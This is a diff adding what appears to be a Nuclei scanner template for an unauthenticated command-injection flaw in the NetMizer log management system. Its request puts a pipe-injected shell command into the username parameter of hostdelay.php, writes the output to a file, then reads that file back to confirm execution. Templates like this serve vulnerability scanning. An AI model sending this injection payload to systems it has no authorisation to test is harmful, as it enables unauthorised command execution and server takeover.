@@ -1,0 +1,22 @@
+id: NetMizer-hostdelay-rce
+
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: NetMizer 日志管理系统position.php、hostdelay.php、等接口处存在命令执行漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。。
+  reference:
+    - http://kpanda.wiki/#/Vulnhub/N7-2NetMizer-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-RCE?id=n7-2netmizer-%e6%97%a5%e5%bf%97%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f-rce
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}" 
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/data/hostdelay/hostdelay.php?action=list&username=|id%20-a>{{filename}}.txt"
+      - "{{BaseURL}}/data/hostdelay/{{filename}}.txt"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
